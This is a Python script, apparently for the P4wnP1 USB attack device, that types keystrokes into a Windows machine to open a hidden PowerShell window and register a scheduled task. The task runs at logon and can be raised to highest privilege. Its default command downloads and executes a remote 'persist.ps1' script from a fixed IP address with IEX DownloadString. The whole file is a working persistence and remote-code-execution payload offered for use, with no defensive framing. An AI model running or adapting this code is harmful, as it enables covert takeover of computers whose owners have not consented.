#!/usr/bin/env python3
# Creates a scheduled task that runs YOUR command (or your downloaded script).
import os, sys, time
P4WN_HOME=os.getenv("P4WN_HOME","/opt/p4wnp1"); sys.path.insert(0, os.path.join(P4WN_HOME,"tools"))
from hid_type import win_r, type_string

TASK_NAME = os.getenv("P4WN_TASK_NAME","P4wnP1Task")
RUN_CMD   = os.getenv("P4WN_TASK_CMD", r"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.13.37.1/payloads/www/private/persist.ps1'); main\"")
TRIGGER   = os.getenv("P4WN_TASK_TRIGGER","ONLOGON")  # e.g., ONLOGON, ONIDLE, DAILY
USER      = os.getenv("P4WN_TASK_USER","")            # blank = current
RUNLVL    = os.getenv("P4WN_TASK_RUNLVL","")          # "HIGHEST" or ""

def main():
    win_r(); time.sleep(0.4); type_string("powershell\n"); time.sleep(0.8)
    highest = "/RL HIGHEST" if RUNLVL.upper()=="HIGHEST" else ""
    useropt = f"/RU \"{USER}\"" if USER else ""
    ps = (
      f"$n='{TASK_NAME}'; $cmd='{RUN_CMD.replace(\"'\",\"''\")}'; "
      f"$t='{TRIGGER}'; $hi='{highest}'; $ru='{useropt}'; "
      f"$args='/Create /TN \"'+$n+'\" /TR \"'+$cmd+'\" /SC '+$t+' '+$hi+' '+$ru; "
      f"Start-Process schtasks.exe -ArgumentList $args -Verb runAs -WindowStyle Hidden -Wait;"
    )
    type_string(f"powershell -nop -w hidden -c \"{ps.replace('\"','\"\"')}\"\n")
    print("[*] Scheduled task wrapper invoked.")
    return 0

if __name__=='__main__': sys.exit(main())
